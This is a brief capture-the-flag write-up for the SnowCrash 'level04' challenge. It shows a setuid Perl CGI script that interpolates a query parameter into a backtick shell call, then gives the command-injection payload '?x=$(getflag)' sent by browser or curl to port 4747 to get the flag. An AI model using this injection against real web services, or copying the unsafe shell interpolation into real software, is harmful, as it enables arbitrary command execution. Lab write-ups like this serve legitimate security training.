# Level04 Writeup

## Info 
User level04 has a setuid `flag04` perl script `level04.pl` in the root of the home directory.
 
`level04.pl`:
``` perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
 $y = $_[0];
 print `echo $y 2>&1`;
}
x(param("x"));
```
 
We can see with `nmap -p- IPOFVIRTUALMACHINE`, (We can get the ip of the snowcrash virtual machine with `ip a`), that indeed the port 4747 is open. Navigate with a web browser and we are greeted with a blank page.

## Victory

Navigating to `IPOFVIRTUALMACHINE:4747?x=$(getflag)` in a web browser or using curl gets us the flag. `curl localhost:4747\?x=\$\(getflag\)` is an example.

